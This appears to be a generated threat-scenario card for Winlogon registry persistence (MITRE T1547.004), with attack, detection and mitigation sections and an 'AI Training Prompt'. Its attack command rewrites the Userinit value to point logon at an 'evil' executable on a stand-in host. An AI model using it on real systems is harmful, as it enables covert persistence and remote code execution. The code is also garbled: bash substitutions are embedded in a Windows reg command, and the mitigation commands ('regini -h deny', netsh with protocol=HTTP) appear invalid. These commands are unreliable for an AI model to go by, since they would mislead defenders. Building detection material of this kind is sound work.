---
type: campaign
scenario_id: 254
tactic: Persistence
technique: "T1547.004: Winlogon"
technique_id: T1547.004
tags: [campaign, lotl, persistence]
---

# Modifying Winlogon registry remotely for persistence.

## Threat Description
Modifying Winlogon registry remotely for persistence.

## Attack Command
```
reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)" /f
```

## Detection Logic
Monitor Winlogon changes: `reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit | findstr http`; Event ID 4657.

## Mitigation
Restrict Winlogon writes: `regini -h deny HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`; Block Winlogon downloads: `netsh advfirewall firewall add rule name='Block Winlogon' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote Winlogon tampering and suggest firewall rules.

## References
- MITRE ATT&CK T1547.004: https://attack.mitre.org/techniques/T1547/004/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
